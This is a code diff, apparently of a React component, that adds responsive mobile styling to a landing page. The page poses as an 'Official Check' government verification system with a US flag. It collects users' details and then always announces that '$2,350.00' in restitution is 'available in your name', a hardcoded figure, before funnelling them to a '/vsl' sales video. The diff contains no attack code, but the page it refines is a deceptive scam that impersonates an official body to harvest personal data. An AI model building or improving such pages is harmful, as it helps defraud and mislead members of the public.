@@ -56,15 +56,15 @@ function Stepper({ current }: { current: 1 | 2 | 3 }) {
   ];
   const progress = current === 1 ? 0 : current === 2 ? 50 : 100;
   return (
-    <div className="pb-6">
-      <div className="flex items-center justify-between gap-2">
+    <div className="pb-5 sm:pb-6">
+      <div className="flex items-center justify-between gap-1 sm:gap-2">
         {steps.map((s) => {
           const active = current === s.n;
           const done = current > s.n;
           return (
-            <div key={s.n} className="flex flex-1 flex-col items-center">
+            <div key={s.n} className="flex flex-1 flex-col items-center min-w-0">
               <div
-                className={`flex h-10 w-10 items-center justify-center rounded-full border-2 text-sm font-semibold transition-colors ${
+                className={`flex h-8 w-8 sm:h-10 sm:w-10 items-center justify-center rounded-full border-2 text-xs sm:text-sm font-semibold transition-colors ${
                   done
                     ? "border-emerald-500 bg-emerald-50 text-emerald-600"
                     : active
@@ -72,10 +72,10 @@ function Stepper({ current }: { current: 1 | 2 | 3 }) {
                       : "border-muted-foreground/30 text-muted-foreground"
                 }`}
               >
-                {done ? <Check className="h-5 w-5" /> : s.n}
+                {done ? <Check className="h-4 w-4 sm:h-5 sm:w-5" /> : s.n}
               </div>
               <span
-                className={`mt-2 text-xs font-semibold ${
+                className={`mt-1.5 sm:mt-2 text-[11px] sm:text-xs font-semibold text-center ${
                   done
                     ? "text-emerald-600"
                     : active
@@ -213,7 +213,7 @@ function Index() {
 
   return (
     <div
-      className="min-h-screen"
+      className="min-h-screen overflow-x-hidden"
       style={
         {
           backgroundColor: "#f3f6fa",
@@ -223,12 +223,12 @@ function Index() {
     >
       {/* Header — hidden on mobile during verify */}
       <header className={`bg-[var(--brand)] text-white ${focusMode ? "hidden md:block" : ""}`}>
-        <div className="mx-auto flex max-w-6xl items-center justify-between px-6 py-4">
-          <div className="flex items-center gap-3">
-            <FlagUS size={28} />
-            <div className="leading-tight">
-              <div className="text-base font-bold">Official Check</div>
-              <div className="text-xs text-white/70">
+        <div className="mx-auto flex max-w-6xl items-center justify-between gap-3 px-4 py-3 sm:px-6 sm:py-4">
+          <div className="flex min-w-0 items-center gap-2 sm:gap-3">
+            <FlagUS size={24} />
+            <div className="min-w-0 leading-tight">
+              <div className="truncate text-sm font-bold sm:text-base">Official Check</div>
+              <div className="truncate text-[10px] text-white/70 sm:text-xs">
                 Verify if there are restitutions
               </div>
             </div>
@@ -237,18 +237,18 @@ function Index() {
         </div>
 
         {/* Hero */}
-        <div className="mx-auto max-w-6xl px-6 pb-12 pt-6">
-          <div className="mb-3 inline-flex items-center gap-2 rounded-full border border-white/20 bg-white/5 px-3 py-1 text-xs font-medium text-white/90">
+        <div className="mx-auto max-w-6xl px-4 pb-8 pt-4 sm:px-6 sm:pb-12 sm:pt-6">
+          <div className="mb-3 inline-flex items-center gap-2 rounded-full border border-white/20 bg-white/5 px-2.5 py-1 text-[11px] font-medium text-white/90 sm:px-3 sm:text-xs">
             <Suspense fallback={<IconFallback />}>
               <BadgeCheck className="h-3.5 w-3.5 text-emerald-400" />
             </Suspense>
             Official verification system
           </div>
-          <h1 className="text-2xl font-bold leading-snug md:text-3xl">
+          <h1 className="text-xl font-bold leading-snug sm:text-2xl md:text-3xl">
             Check if there are restitutions in your name —
             <span className="text-emerald-300"> response in 10 seconds</span>
           </h1>
-          <p className="mt-2 max-w-2xl text-sm text-white/70">
+          <p className="mt-2 max-w-2xl text-xs text-white/70 sm:text-sm">
             Enter your details below to securely check eligibility. Your data is
             encrypted and never shared with third parties.
           </p>
@@ -257,13 +257,13 @@ function Index() {
 
       {/* Card */}
       <main
-        className={`mx-auto max-w-3xl px-4 pb-12 ${
+        className={`mx-auto max-w-3xl px-3 pb-10 sm:px-4 sm:pb-12 ${
           focusMode
             ? "flex min-h-screen items-center justify-center md:-mt-6 md:block md:min-h-0"
             : "-mt-6"
         }`}
       >
-        <div className="w-full rounded-xl bg-white p-6 shadow-lg ring-1 ring-black/5 md:p-8">
+        <div className="w-full rounded-xl bg-white p-4 shadow-lg ring-1 ring-black/5 sm:p-6 md:p-8">
           <Stepper current={step} />
 
           {step === 1 && (
@@ -387,41 +387,41 @@ function Index() {
           )}
 
           {step === 3 && (
-            <div className="mt-8 flex flex-col items-center text-center">
-              <h2 className="text-2xl font-bold leading-tight text-foreground md:text-3xl">
+            <div className="mt-6 sm:mt-8 flex flex-col items-center text-center">
+              <h2 className="text-xl sm:text-2xl md:text-3xl font-bold leading-tight text-foreground break-words">
                 Congratulations{name ? `, ${name}` : ""} — there are{" "}
                 <span className="text-emerald-600">$2,350.00</span> available in
                 your name.
               </h2>
               {stateVal && (
-                <p className="mt-2 text-sm text-muted-foreground">
+                <p className="mt-2 text-xs sm:text-sm text-muted-foreground">
                   State selected: {stateVal}.
                 </p>
               )}
 
-              <div className="my-8 text-5xl font-extrabold tracking-tight text-emerald-600 md:text-6xl">
+              <div className="my-6 sm:my-8 text-4xl sm:text-5xl md:text-6xl font-extrabold tracking-tight text-emerald-600">
                 $2,350.00
               </div>
-              <p className="text-xs font-medium text-muted-foreground">
+              <p className="text-xs font-medium text-muted-foreground break-all">
                 Record #: {recordId}
               </p>
 
               <Link
                 to="/vsl"
                 preload="intent"
-                className="mt-6 flex w-full animate-pulse items-center justify-center gap-2 rounded-md bg-[var(--brand)] px-4 py-3 text-sm font-semibold text-white shadow ring-2 ring-emerald-400/60 ring-offset-2 transition-transform hover:scale-[1.02] hover:opacity-90"
+                className="mt-6 flex w-full animate-pulse items-center justify-center gap-2 rounded-md bg-[var(--brand)] px-3 py-3 text-xs sm:text-sm font-semibold text-white shadow ring-2 ring-emerald-400/60 ring-offset-2 transition-transform hover:scale-[1.02] hover:opacity-90 text-center"
               >
-                <Play className="h-4 w-4" />
-                Watch Official Video: How to Receive
+                <Play className="h-4 w-4 shrink-0" />
+                <span className="leading-tight">Watch Official Video: How to Receive</span>
               </Link>
               <button
                 type="button"
-                className="mt-3 flex w-full items-center justify-center gap-2 rounded-md bg-muted px-4 py-3 text-sm font-semibold text-muted-foreground hover:bg-muted/70"
+                className="mt-3 flex w-full items-center justify-center gap-2 rounded-md bg-muted px-3 py-3 text-xs sm:text-sm font-semibold text-muted-foreground hover:bg-muted/70 text-center"
               >
                 <Suspense fallback={<IconFallback />}>
-                  <Download className="h-4 w-4" />
+                  <Download className="h-4 w-4 shrink-0" />
                 </Suspense>{" "}
-                Download Instructions (PDF) — Watch video first
+                <span className="leading-tight">Download Instructions (PDF) — Watch video first</span>
               </button>
 
               <button
@@ -463,13 +463,13 @@ function Index() {
 
       {/* Footer — only Privacy Policy, hidden on mobile during verify */}
       <footer className={`border-t border-border bg-white ${focusMode ? "hidden md:block" : ""}`}>
-        <div className="mx-auto max-w-6xl px-6 py-8 text-xs text-muted-foreground">
-          <div className="flex flex-wrap items-center justify-between gap-4">
+        <div className="mx-auto max-w-6xl px-4 py-6 text-xs text-muted-foreground sm:px-6 sm:py-8">
+          <div className="flex flex-col items-start justify-between gap-3 sm:flex-row sm:items-center sm:gap-4">
             <div className="flex items-center gap-2">
               <FlagUS size={20} />
               <span className="font-semibold text-foreground">Official Check</span>
             </div>
-            <div className="flex flex-wrap gap-4">
+            <div className="flex flex-wrap gap-x-4 gap-y-2">
               <a href="#" className="hover:text-foreground">Privacy Policy</a>
             </div>
           </div>
